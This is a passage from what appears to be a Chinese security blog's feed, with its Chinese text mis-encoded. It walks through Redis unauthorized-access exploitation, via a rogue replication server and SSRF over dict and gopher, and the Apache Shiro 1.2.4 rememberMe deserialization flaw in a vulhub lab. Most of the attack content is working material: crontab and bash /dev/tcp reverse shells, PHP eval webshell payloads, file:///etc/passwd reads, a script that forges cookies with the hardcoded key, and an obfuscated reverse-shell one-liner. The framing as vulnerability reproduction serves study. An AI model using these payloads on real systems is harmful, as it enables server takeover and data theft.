class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line"></span><br><span class="line">    parser = OptionParser()                     </span><br><span class="line">    parser.add_option(<span class="string">&quot;--lport&quot;</span>, dest=<span class="string">&quot;lp&quot;</span>, <span class="built_in">type</span>=<span class="string">&quot;int&quot;</span>,<span class="built_in">help</span>=<span class="string">&quot;rogue server listen port, default 21000&quot;</span>, default=<span class="number">21000</span>,metavar=<span class="string">&quot;LOCAL_PORT&quot;</span>)        </span><br><span class="line">    parser.add_option(<span class="string">&quot;-f&quot;</span>,<span class="string">&quot;--exp&quot;</span>, dest=<span class="string">&quot;exp&quot;</span>, <span class="built_in">type</span>=<span class="string">&quot;string&quot;</span>,<span class="built_in">help</span>=<span class="string">&quot;Redis Module to load, default exp.so&quot;</span>, default=<span class="string">&quot;exp.so&quot;</span>,metavar=<span class="string">&quot;EXP_FILE&quot;</span>)            </span><br><span class="line"></span><br><span class="line">    (options , args )= parser.parse_args()</span><br><span class="line">    lport = options.lp</span><br><span class="line">    exp_filename = options.exp</span><br><span class="line"></span><br><span class="line">    CLRF=<span class="string">&quot;\r\n&quot;</span></span><br><span class="line">    payload=<span class="built_in">open</span>(exp_filename,<span class="string">&quot;rb&quot;</span>).read()</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;Start listing on port: %s&quot;</span> %lport</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;Load the payload:   %s&quot;</span> %exp_filename     </span><br><span class="line">    RogueServer(lport)</span><br></pre></td></tr></table></figure>

<p>è¿è¡Œè„šæœ¬</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python RogueServer.py --lport 8088 --exp exp.so</span><br></pre></td></tr></table></figure>

<p> <img src="https://cdn.jsdelivr.net/gh/syyu6/Images/img/202112032109720.png" alt="image-20211203201601816"></p>
<p>æ‰§è¡Œç›¸å…³å‘½ä»¤ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#è®¾ç½®redisçš„å¤‡ä»½è·¯å¾„ä¸ºå½“å‰ç›®å½•</span><br><span class="line">&gt; config set dir ./</span><br><span class="line">#è®¾ç½®å¤‡ä»½æ–‡ä»¶åä¸ºexp.soï¼Œé»˜è®¤ä¸ºdump.rdb</span><br><span class="line">&gt; config set dbfilename exp.so</span><br><span class="line">#è®¾ç½®ä¸»æœåŠ¡å™¨IPå’Œç«¯å£</span><br><span class="line">&gt; slaveof 192.168.56.106 8088</span><br><span class="line">#åŠ è½½æ¶æ„æ¨¡å—</span><br><span class="line">&gt; module load ./exp.so</span><br><span class="line">#åˆ‡æ–­ä¸»ä»ï¼Œå…³é—­å¤åˆ¶åŠŸèƒ½</span><br><span class="line">&gt; slaveof no one</span><br><span class="line">#æ‰§è¡Œç³»ç»Ÿå‘½ä»¤</span><br><span class="line">&gt; system.exec &#x27;whoami&#x27;</span><br><span class="line">&gt; system.rev 127.0.0.1 9999    </span><br><span class="line">#é€šè¿‡dump.rdbæ–‡ä»¶æ¢å¤æ•°æ®</span><br><span class="line">&gt; config set dbfilename dump.rdb</span><br><span class="line">#åˆ é™¤exp.so</span><br><span class="line">&gt; system.exec &#x27;rm ./exp.so&#x27;</span><br><span class="line">#å¸è½½systemæ¨¡å—çš„åŠ è½½</span><br><span class="line">&gt; module unload system</span><br></pre></td></tr></table></figure>

<p> <img src="https://cdn.jsdelivr.net/gh/syyu6/Images/img/202112032108634.png" alt="image-20211203201544438"></p>
<h3 id="expæ±‡æ€»"><a href="#expæ±‡æ€»" class="headerlink" title="expæ±‡æ€»"></a>expæ±‡æ€»</h3><p>[+] æ„é€ æ¶æ„soæ–‡ä»¶:  <a href="https://github.com/n0b0dyCN/RedisModules-ExecuteCommand">https://github.com/n0b0dyCN/RedisModules-ExecuteCommand</a></p>
<p><a href="https://github.com/vulhub/redis-rogue-getshell">https://github.com/vulhub/redis-rogue-getshell</a></p>
<p><a href="https://github.com/Ridter/redis-rce">https://github.com/Ridter/redis-rce</a></p>
<p><a href="https://github.com/LoRexxar/redis-rogue-server">https://github.com/LoRexxar/redis-rogue-server</a></p>
<p><strong>å‚è€ƒé“¾æ¥:</strong></p>
<p><a href="https://www.cnblogs.com/xiaozi/p/13089906.html">https://www.cnblogs.com/xiaozi/p/13089906.html</a></p>
<h2 id="SSRFåˆ©ç”¨æ–¹å¼"><a href="#SSRFåˆ©ç”¨æ–¹å¼" class="headerlink" title="SSRFåˆ©ç”¨æ–¹å¼"></a>SSRFåˆ©ç”¨æ–¹å¼</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">127.0.0.1</span><br><span class="line">ä»£æ›¿æ–¹å¼: 127.1</span><br><span class="line">[::1]</span><br><span class="line">localhost</span><br><span class="line">è½¬æˆ10è¿›åˆ¶, 2130706433</span><br></pre></td></tr></table></figure>

<p>é€šè¿‡dictåè®®åˆ©ç”¨redisçš„æœªæˆæƒè®¿é—®åå¼¹shellçš„æ­¥éª¤å¦‚ä¸‹ï¼š</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line"># 1ã€å¼€å¯åå¼¹shellçš„ç›‘å¬</span><br><span class="line">nc -l 9999</span><br><span class="line"># 2ã€ä¾æ¬¡æ‰§è¡Œä¸‹é¢çš„å‘½ä»¤</span><br><span class="line">curl dict://192.168.0.119:6379/set:x:&quot;\n\n* * * * * root bash -i &gt;&amp; /dev/tcp/192.168.0.119/9999 0&gt;&amp;1\n\n&quot;</span><br><span class="line">curl dict://192.168.0.119:6379/config:set:dir:/etc/</span><br><span class="line">curl dict://192.168.0.119:6379/config:set:dbfilename:crontab</span><br><span class="line">curl dict://192.168.0.119:6379/bgsave</span><br></pre></td></tr></table></figure>

<h3 id="1-fileåè®®è¯»å–æ–‡ä»¶"><a href="#1-fileåè®®è¯»å–æ–‡ä»¶" class="headerlink" title="1.fileåè®®è¯»å–æ–‡ä»¶"></a>1.fileåè®®è¯»å–æ–‡ä»¶</h3><p>è¿™ä¸ªåè®®å¯ä»¥è¯»å–ç³»ç»Ÿçš„ä¸€äº›å­˜æ”¾å¯†ç çš„æ–‡ä»¶ï¼Œæ¯”å¦‚è¯´linuxçš„&#x2F;etc&#x2F;passwdæˆ–è€…windowsçš„C:&#x2F;windows&#x2F;win.ini ç­‰ï¼Œæˆ–è€…è¯´ctfä¸­çš„flagæ–‡ä»¶ã€‚</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://xxx.xxx.xx.xx/xx/xx.php?url=file:///etc/passwd</span><br></pre></td></tr></table></figure>

<h3 id="2-åˆ©ç”¨gphperåè®®"><a href="#2-åˆ©ç”¨gphperåè®®" class="headerlink" title="2.åˆ©ç”¨gphperåè®®"></a>2.åˆ©ç”¨gphperåè®®</h3><p>åˆ©ç”¨å·¥å…·gphperus, ç”Ÿæˆpayload</p>
<p><a href="https://github.com/tarunkant/Gopherus">https://github.com/tarunkant/Gopherus</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gopherus --exploit redis</span><br><span class="line">Ready To get SHELL</span><br><span class="line"></span><br><span class="line">What do you want?? (ReverseShell/PHPShell): PHPShell</span><br><span class="line"></span><br><span class="line">Give web root location of server (default is /var/www/html): </span><br><span class="line">Give PHP Payload (We have default PHP Shell): &lt;?php @eval($_POST[&#x27;cmd&#x27;])?&gt;</span><br><span class="line"></span><br><span class="line">Your gopher link is Ready to get PHP Shell:</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">url=gopher://127.1:6379/_%252A1%250D%250A%25248%250D%250Aflushall%250D%250A%252A3%250D%250A%25243%250D%250Aset%250D%250A%25241%250D%250A1%250D%250A%252428%250D%250A%250A%250A%253C%253Fphp%2520%2540eval%2528%2524_POST%255B1%255D%2529%253F%253E%250A%250A%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%25243%250D%250Adir%250D%250A%252413%250D%250A%2Fvar%2Fwww%2Fhtml%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%252410%250D%250Adbfilename%250D%250A%25249%250D%250Ashell.php%250D%250A%252A1%250D%250A%25244%250D%250Asave%250D%250A%250A</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">åŸå§‹å†…å®¹: éœ€è¦ä¸¤æ¬¡urlç¼–ç </span><br><span class="line">gopher://2130706433:6379/_set x &quot;\n\n\n&lt;?php @eval($_POST[&#x27;cmd&#x27;]);?&gt;\n\n\n&quot;  </span><br><span class="line">config set dir /var/www/html  </span><br><span class="line">config set dbfilename shell.php  </span><br><span class="line">save</span><br></pre></td></tr></table></figure>



<h3 id="3-åˆ©ç”¨dictåè®®"><a href="#3-åˆ©ç”¨dictåè®®" class="headerlink" title="3.åˆ©ç”¨dictåè®®"></a>3.åˆ©ç”¨dictåè®®</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://172.16.20.51:28940/?url=dict://2130706433:6379/info</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://172.16.20.51:28940/?url=dict://2130706433:6379/set:x:&quot;&lt;?php @eval($_POST[1])?&gt;&quot;</span><br><span class="line">shelléœ€è¦è¿›è¡Œutf-8ç¼–ç </span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">config:set:dir:/var/www/html</span><br><span class="line">config:set:dbfilename:shell.php</span><br><span class="line">set:x:&quot;&lt;?php @eval($_POST[1])?&gt;&quot;</span><br><span class="line">save</span><br></pre></td></tr></table></figure>

<ul>
<li><h4 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h4></li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">url=dict://2130706433:6379/set:x:&quot;\x3C\x3F\x70\x68\x70\x20\x40\x65\x76\x61\x6C\x28\x24\x5F\x50\x4F\x53\x54\x5B\x31\x5D\x29\x3F\x3E&quot;</span><br><span class="line">config:set:dir:/var/www/html</span><br><span class="line">config:set:dbfilename:shell.php</span><br><span class="line">save</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ curl http://172.16.20.51:28151/?url=dict://2130706433:6379/config:get:dir</span><br><span class="line">-ERR Syntax error, try CLIENT (LIST | KILL | GETNAME | SETNAME | PAUSE | REPLY)</span><br><span class="line">*2</span><br><span class="line">$3</span><br><span class="line">dir</span><br><span class="line">$13</span><br><span class="line">/var/www/html</span><br><span class="line">+OK</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">å°†å†…å®¹è½¬æˆutf-<span class="number">8</span></span><br><span class="line">s = <span class="string">&quot;&lt;?php @eval($_POST[1])?&gt;&quot;</span></span><br><span class="line">res = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">    res += <span class="built_in">hex</span>(<span class="built_in">ord</span>(i)).replace(<span class="string">&quot;0xa&quot;</span>,<span class="string">&quot;0x0a&quot;</span>).replace(<span class="string">&quot;0x&quot;</span>,<span class="string">r&quot;\\x&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(res)</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php @eval($_POST[1])?&gt;</span><br><span class="line">è½¬æˆutf-8, \\x3c\\x3f\\x70\\x68\\x70\\x20\\x40\\x65\\x76\\x61\\x6c\\x28\\x24\\x5f\\x50\\x4f\\x53\\x54\\x5b\\x31\\x5d\\x29\\x3f\\x3e å¯¹\è¿›è¡Œè½¬ä¹‰</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">curl http://172.16.20.51:28151/?url=dict://2130706433:6379/set:x:\&quot;\\x3c\\x3f\\x70\\x68\\x70\\x20\\x40\\x65\\x76\\x61\\x6c\\x28\\x24\\x5f\\x50\\x4f\\x53\\x54\\x5b\\x31\\x5d\\x29\\x3f\\x3e\&quot;</span><br><span class="line">ä½¿ç”¨ curl éœ€è¦å¯¹xçš„é”®å€¼è¿›è¡Œè½¬ä¹‰</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php @eval($_POST[&#x27;cmd&#x27;])?&gt;</span><br></pre></td></tr></table></figure>







<h2 id="å‚è€ƒé“¾æ¥"><a href="#å‚è€ƒé“¾æ¥" class="headerlink" title="å‚è€ƒé“¾æ¥:"></a>å‚è€ƒé“¾æ¥:</h2><p><a href="https://zhuanlan.zhihu.com/p/36529010">https://zhuanlan.zhihu.com/p/36529010</a></p>
<p><a href="https://mp.weixin.qq.com/s?__biz=Mzg4MzA4Nzg4Ng==&mid=2247483814&idx=1&sn=572eff495ac4e2f80583c27ddf8fe96b&chksm=cf4d8ec7f83a07d1ad01d06e78c5905508ca32b38681f8c1268cdf0ae7d0f9e3d88e229cf87b">https://mp.weixin.qq.com/s?__biz=Mzg4MzA4Nzg4Ng==&amp;mid=2247483814&amp;idx=1&amp;sn=572eff495ac4e2f80583c27ddf8fe96b&amp;chksm=cf4d8ec7f83a07d1ad01d06e78c5905508ca32b38681f8c1268cdf0ae7d0f9e3d88e229cf87b</a></p>
<p><a href="http://blog.leanote.com/post/snowming/2d9a2082c02b">http://blog.leanote.com/post/snowming/2d9a2082c02b</a></p>
<p>[+] åˆ©ç”¨ä¸»ä»å¤åˆ¶getshell: <a href="https://www.cnblogs.com/xiaozi/p/13089906.html">https://www.cnblogs.com/xiaozi/p/13089906.html</a></p>
]]></content>
      <categories>
        <category>ç½‘ç»œå®‰å…¨</category>
        <category>æ¼æ´å¤ç°</category>
      </categories>
      <tags>
        <tag>æŠ€å·§</tag>
        <tag>ç½‘ç»œå®‰å…¨</tag>
        <tag>æ€»ç»“</tag>
      </tags>
  </entry>
  <entry>
    <title>shiro1.2.4ååºåˆ—åŒ–æ¼æ´å¤ç°</title>
    <url>/articles/a27657b2/</url>
    <content><![CDATA[<h1 id="shiro-ååºåˆ—åŒ–æ¼æ´å¤ç°"><a href="#shiro-ååºåˆ—åŒ–æ¼æ´å¤ç°" class="headerlink" title="shiro ååºåˆ—åŒ–æ¼æ´å¤ç°"></a>shiro ååºåˆ—åŒ–æ¼æ´å¤ç°</h1><h2 id="æ¼æ´è¯¦æƒ…"><a href="#æ¼æ´è¯¦æƒ…" class="headerlink" title="æ¼æ´è¯¦æƒ…"></a>æ¼æ´è¯¦æƒ…</h2><p>Apache Shiro æ˜¯ä¸€ä¸ªå¼€æºå®‰å…¨æ¡†æ¶ï¼Œæä¾›èº«ä»½éªŒè¯ã€æˆæƒã€å¯†ç å­¦å’Œä¼šè¯ç®¡ç†ã€‚åœ¨å®ƒç¼–å·ä¸º 550 çš„ issue ä¸­çˆ†å‡ºä¸¥é‡çš„ Java ååºåˆ—åŒ–æ¼æ´ã€‚</p>
<p>åœ¨ Apache Shiro&lt;&#x3D;1.2.4 ç‰ˆæœ¬ä¸­ AES åŠ å¯†æ—¶é‡‡ç”¨çš„ key æ˜¯<strong>ç¡¬ç¼–ç </strong>åœ¨ä»£ç ä¸­çš„ï¼Œè¿™å°±ä¸ºä¼ªé€  cookie æä¾›äº†æœºä¼šã€‚åªè¦ rememberMe çš„ AES åŠ å¯†å¯†é’¥æ³„éœ²ï¼Œæ— è®º shiro æ˜¯ä»€ä¹ˆç‰ˆæœ¬éƒ½ä¼šå¯¼è‡´ååºåˆ—åŒ–æ¼æ´ã€‚</p>
<p>Shiro çš„ â€œè®°ä½æˆ‘â€ åŠŸèƒ½æ˜¯è®¾ç½® cookie ä¸­çš„ rememberMe å€¼æ¥å®ç°ã€‚å½“åç«¯æ¥æ”¶åˆ°æ¥è‡ªæœªç»èº«ä»½éªŒè¯çš„ç”¨æˆ·çš„è¯·æ±‚æ—¶ï¼Œå®ƒå°†é€šè¿‡æ‰§è¡Œä»¥ä¸‹æ“ä½œæ¥å¯»æ‰¾ä»–ä»¬è®°ä½çš„èº«ä»½ï¼š</p>
<ol>
<li>æ£€ç´¢ cookie ä¸­ RememberMe çš„å€¼</li>
<li>Base64 è§£ç </li>
<li>ä½¿ç”¨ AES è§£å¯†</li>
<li>ååºåˆ—åŒ–</li>
</ol>
<p>æ¼æ´åŸå› åœ¨äºç¬¬ä¸‰æ­¥ï¼Œåœ¨ Apache Shiro&lt;&#x3D;1.2.4 ç‰ˆæœ¬ä¸­ AES åŠ å¯†æ—¶é‡‡ç”¨çš„ key æ˜¯<strong>ç¡¬ç¼–ç </strong>åœ¨ä»£ç ä¸­çš„ï¼Œäºæ˜¯æˆ‘ä»¬å°±å¯ä»¥æ„é€  RememberMe çš„å€¼ï¼Œç„¶åè®©å…¶ååºåˆ—åŒ–æ‰§è¡Œã€‚</p>
<blockquote>
<p>  åªè¦ rememberMe çš„ AES åŠ å¯†å¯†é’¥æ³„éœ²ï¼Œæ— è®º shiro æ˜¯ä»€ä¹ˆç‰ˆæœ¬éƒ½ä¼šå¯¼è‡´ååºåˆ—åŒ–æ¼æ´ã€‚</p>
</blockquote>
<h2 id="ç¯å¢ƒæ­å»º"><a href="#ç¯å¢ƒæ­å»º" class="headerlink" title="ç¯å¢ƒæ­å»º"></a>ç¯å¢ƒæ­å»º</h2><p><strong>Windows10 + IDEA</strong>  </p>
<p><strong>shiro 1.2.4</strong></p>
<p><strong>tomcat 8.5.73</strong></p>
<p>ä¸‹è½½ shiro 1.2.4</p>
<p>githubåœ°å€: <a href="https://github.com/apache/shiro/releases/tag/shiro-root-1.2.4">https://github.com/apache/shiro/releases/tag/shiro-root-1.2.4</a></p>
<p>æˆ–è€… clone shiroæºç  , åˆ‡æ¢ 1.2.4 æœ‰æ¼æ´çš„ç‰ˆæœ¬</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/apache/shiro.git  </span><br><span class="line">cd shiro</span><br><span class="line">git checkout shiro-root-1.2.4</span><br></pre></td></tr></table></figure>

<h3 id="ä½¿ç”¨-IDEA-è¿›è¡Œç¯å¢ƒæ­å»º"><a href="#ä½¿ç”¨-IDEA-è¿›è¡Œç¯å¢ƒæ­å»º" class="headerlink" title="ä½¿ç”¨ IDEA è¿›è¡Œç¯å¢ƒæ­å»º"></a>ä½¿ç”¨ IDEA è¿›è¡Œç¯å¢ƒæ­å»º</h3><p>æ‰“å¼€ samples&#x2F;web&#x2F;pom.xml , æ”¯æŒ jsp</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>javax.servlet<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jstl<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--  è¿™é‡Œéœ€è¦å°†jstlè®¾ç½®ä¸º1.2 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">scope</span>&gt;</span>runtime<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--  æ·»åŠ commons-collections4 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.commons<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-collections4<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>ä½¿ç”¨ IDEA è¿è¡Œ , å…ˆé…ç½® è¿è¡Œç¯å¢ƒ</p>
<p>æ·»åŠ  TomcatSever (local) , é…ç½® Tomcat è·¯å¾„</p>
<blockquote>
<p>  tomcat8 ä¸‹è½½åœ°å€: <a href="https://tomcat.apache.org/download-80.cgi">https://tomcat.apache.org/download-80.cgi</a>  </p>
</blockquote>
<p><strong>æ·»åŠ éƒ¨ç½²å·¥ä»¶</strong>  â€œ<code>samples-web:war</code>â€œ</p>
<p> <img src="https://typora-1305076737.cos.ap-shanghai.myqcloud.com/typora_image-20211127120409881.png" alt="image-20211127120409881"></p>
<p><strong>è¯¦ç»†é…ç½®ä¿¡æ¯</strong></p>
<p><img src="https://typora-1305076737.cos.ap-shanghai.myqcloud.com/typora_image-20211127120912994.png" alt="image-20211127120912994"></p>
<p><strong>è¿è¡Œæˆªå›¾</strong></p>
<p><img src="https://typora-1305076737.cos.ap-shanghai.myqcloud.com/typora_image-20211127121337330.png" alt="image-20211127121337330"></p>
<h3 id="ä½¿ç”¨-Vulhub-Docker-æ­å»º"><a href="#ä½¿ç”¨-Vulhub-Docker-æ­å»º" class="headerlink" title="ä½¿ç”¨ Vulhub Docker æ­å»º"></a>ä½¿ç”¨ Vulhub Docker æ­å»º</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> vulhub/shiro/CVE-2016-4437</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure>



<p><img src="https://typora-1305076737.cos.ap-shanghai.myqcloud.com/typora_image-20211127172017961.png" alt="image-20211127172017961"></p>
<h2 id="æ¼æ´å¤ç°"><a href="#æ¼æ´å¤ç°" class="headerlink" title="æ¼æ´å¤ç°"></a>æ¼æ´å¤ç°</h2><p> <strong>payloadç”Ÿæˆè¿‡ç¨‹</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">å‘½ä»¤=&gt;åºåˆ—åŒ–=&gt;AESåŠ å¯†=&gt;base64ç¼–ç =&gt;RememberMe Cookieå€¼</span><br></pre></td></tr></table></figure>

<h3 id="vulhub-Docker-ç¯å¢ƒ"><a href="#vulhub-Docker-ç¯å¢ƒ" class="headerlink" title="vulhub Docker ç¯å¢ƒ"></a>vulhub Docker ç¯å¢ƒ</h3><p>ä½¿ç”¨<code>ysoserial</code>ç”ŸæˆCommonsBeanutils1çš„Gadgetï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">java -jar ./ysoserial.jar CommonsBeanutils1 <span class="string">&quot;touch /tmp/success&quot;</span> &gt; poc.ser</span><br><span class="line">java -jar ./ysoserial.jar CommonsCollections2 <span class="string">&quot;touch /tmp/success&quot;</span> &gt; poc.ser</span><br></pre></td></tr></table></figure>

<p>ysoserial é¡¹ç›®åœ°å€: <a href="https://github.com/frohoff/ysoserial">https://github.com/frohoff/ysoserial</a></p>
<p>shiro 1.2.4 ç‰ˆæœ¬ , ä½¿ç”¨çš„æ˜¯é»˜è®¤key: <code>kPH+bIxk5D2deZiIxcaaaA==</code></p>
<p>AESåŠ å¯† ccé“¾ , ä¸ºrememberMeçš„Cookieå€¼</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> Random</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encode_rememberme</span>(<span class="params">command</span>):</span><br><span class="line">    popen = subprocess.Popen([<span class="string">&#x27;java&#x27;</span>, <span class="string">&#x27;-jar&#x27;</span>, <span class="string">&#x27;ysoserial-master-SNAPSHOT.jar&#x27;</span>, <span class="string">&#x27;CommonsBeanutils1&#x27;</span>, command], stdout=subprocess.PIPE)</span><br><span class="line">    BS   = AES.block_size</span><br><span class="line">    pad = <span class="keyword">lambda</span> s: s + ((BS - <span class="built_in">len</span>(s) % BS) * <span class="built_in">chr</span>(BS - <span class="built_in">len</span>(s) % BS)).encode()</span><br><span class="line">    key  =  <span class="string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span></span><br><span class="line">    mode =  AES.MODE_CBC</span><br><span class="line">    iv   =  uuid.uuid4().<span class="built_in">bytes</span></span><br><span class="line">    encryptor = AES.new(base64.b64decode(key), mode, iv)</span><br><span class="line">    file_body = pad(popen.stdout.read())</span><br><span class="line">    base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))</span><br><span class="line">    <span class="keyword">return</span> base64_ciphertext</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    payload = encode_rememberme(sys.argv[<span class="number">1</span>])  </span><br><span class="line">    <span class="comment"># payload = encode_rememberme(&quot;touch /tmp/123456&quot;)</span></span><br><span class="line">    <span class="comment"># with open(&quot;payload.cookie&quot;, &quot;w&quot;) as fpw:</span></span><br><span class="line">        <span class="comment"># print(&quot;rememberMe=&#123;&#125;&quot;.format(payload.decode()), file=fpw)</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;rememberMe=&#123;&#125;&quot;</span>.<span class="built_in">format</span>(payload.decode()))</span><br></pre></td></tr></table></figure>

<p>è¿è¡Œè„šæœ¬, å¾—åˆ°payload </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python test.py &quot;touch /tmp/123456&quot;</span><br></pre></td></tr></table></figure>

<p>å‘é€è¯·æ±‚åŒ…</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// åŠ  -I æ˜¯åªçœ‹å“åº”å¤´ï¼Œè¿™é‡Œä¸»è¦å…³æ³¨set-cookie:rememberMe</span><br><span class="line">curl -X GET http://192.168.56.106:8080/ --cookie â€œxxxxxxxxxxxxxâ€ -I</span><br></pre></td></tr></table></figure>

<p>æˆ–è€…ä½¿ç”¨BurpæŠ“åŒ…å‘é€</p>
<p><img src="https://typora-1305076737.cos.ap-shanghai.myqcloud.com/typora_image-20211127171801129.png" alt="image-20211127171801129"></p>
<p>æŸ¥çœ‹é¶æœº, å¯ä»¥çœ‹åˆ°å·²ç»ç”Ÿæˆäº† </p>
<p> <img src="https://typora-1305076737.cos.ap-shanghai.myqcloud.com/typora_image-20211127171631781.png" alt="image-20211127171631781"></p>
<p>åå¼¹shell</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.56.1/9090 0&gt;&amp;1</span><br></pre></td></tr></table></figure>

<p>ä½†æ˜¯è¿™æ¡å‘½ä»¤å´æ²¡æœ‰æˆåŠŸæ‰§è¡Œ, åº”è¯¥æ˜¯éƒ¨åˆ†å­—ç¬¦è¢«ç¼–ç å¯¼è‡´çš„</p>
<p>bashå‘½ä»¤ æ··æ·†, <a href="https://www.jackson-t.ca/runtime-exec-payloads.html">https://www.jackson-t.ca/runtime-exec-payloads.html</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjU2LjEvOTA5MCAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;</span><br></pre></td></tr></table></figure>

<p>æˆåŠŸæ¥æ”¶å‘½ä»¤ , åå¼¹shellæˆåŠŸ</p>
<p><img src="https://typora-1305076737.cos.ap-shanghai.myqcloud.com/typora_image-20211127193448038.png" alt="image-20211127193448038"></p>
<h3 id="windows-10-IDEA"><a href="#windows-10-IDEA" class="headerlink" title="windows 10 + IDEA"></a>windows 10 + IDEA</h3><p>æ·»åŠ   commons-collections4 , è¿™æ ·æ‰èƒ½ä½¿ç”¨ CommonsCollections2 é“¾ è¿›è¡Œæ”»å‡»</p>
<p>æ‰“å¼€ samples&#x2F;web&#x2F;pom.xml </p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--  æ·»åŠ commons-collections4 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.commons<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-collections4<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>ä½¿ç”¨ CommonsCollections2 é“¾ ,  </p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python .\test.py <span class="string">&quot;ping 4bwtjr.dnslog.cn&quot;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://typora-1305076737.cos.ap-shanghai.myqcloud.com/typora_image-20211128125802999.png" alt="image-20211128125802999"></p>
